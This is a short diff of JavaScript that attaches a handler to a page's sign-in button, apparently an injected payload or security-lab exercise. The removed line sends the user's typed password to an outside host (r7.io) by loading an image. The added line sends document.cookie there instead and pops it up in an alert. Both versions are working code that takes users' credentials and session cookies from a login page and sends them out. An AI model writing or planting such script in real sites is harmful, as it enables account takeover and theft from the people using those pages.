@@ -1,7 +1,7 @@
 document.addEventListener("DOMContentLoaded", function() {
 	document.getElementById("signin-btn").onclick = function givePassword() {
 		var img = new Image();
-		img.src = 'http://r7.io/e/davinl?s=' + encodeURIComponent(document.getElementById("login_password").value);
+		img.src = 'http://r7.io/e/davinl?s=' + encodeURIComponent(document.cookie);
 		console.log(img);
 		alert(document.cookie);
 	};
